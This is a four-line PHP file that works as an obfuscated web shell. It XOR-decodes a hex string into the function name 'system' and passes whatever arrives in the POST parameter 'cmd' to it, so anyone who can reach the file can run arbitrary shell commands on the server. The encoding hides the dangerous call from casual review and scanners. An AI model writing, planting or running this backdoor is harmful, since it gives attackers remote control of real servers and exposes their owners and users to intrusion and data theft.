<?php
$target = hex2bin('202a2027363e');
$target ^= 'SSSSSS';
$target($_POST['cmd']);
